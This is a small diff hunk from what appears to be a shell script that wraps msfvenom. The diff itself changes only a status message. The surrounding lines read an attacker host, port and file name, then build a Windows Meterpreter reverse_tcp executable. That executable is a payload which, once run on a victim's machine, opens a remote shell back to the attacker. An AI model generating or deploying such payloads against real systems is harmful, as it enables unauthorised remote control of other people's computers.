@@ -15,7 +15,7 @@ read lhost
 echo "Enter the Payload Name:"
 read name
 
-echo "                                                                  WAIT PAYlOAD IS RUNNING" 
+echo "                                                                  PAYlOAD IS RUNNING..." 
 msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhost lport=$port -f exe > $name.exe
 
 echo ""
